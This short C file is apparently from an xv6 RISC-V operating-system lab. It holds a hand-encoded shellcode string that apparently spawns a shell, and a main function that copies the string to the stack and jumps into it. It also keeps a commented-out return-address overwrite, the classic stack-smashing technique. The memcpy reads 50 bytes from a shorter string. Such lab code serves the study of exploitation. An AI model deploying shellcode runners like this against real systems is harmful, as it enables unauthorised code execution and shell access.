#include "kernel/types.h"
#include "user/user.h"

char *shellcode =
    "\xef\x02\x40\x02"
    "\x13\x85\x40\x06"
    "\x13\x05\xc5\xf9"
    "\x08\xe5"
    "\x93\x05\xe5\xff"
    "\xa9\x05"
    "\x33\x48\x08\x01"
    "\x23\x38\x05\x01"
    "\x67\x08\x08\x2e"
    "\x33\x48\x08\x01"
    "\xef\xf0\x1f\xfe"
    "\x73\x68"
    ;

int
main()
{
//     int *ret;
// 
//     ret = (int *)&ret + 2;
//     (*ret) = (int)shellcode;
    char payload[50];

    memcpy(payload, shellcode, 50);

    (*(void(*)()) payload) ();
    
    return 0;
}
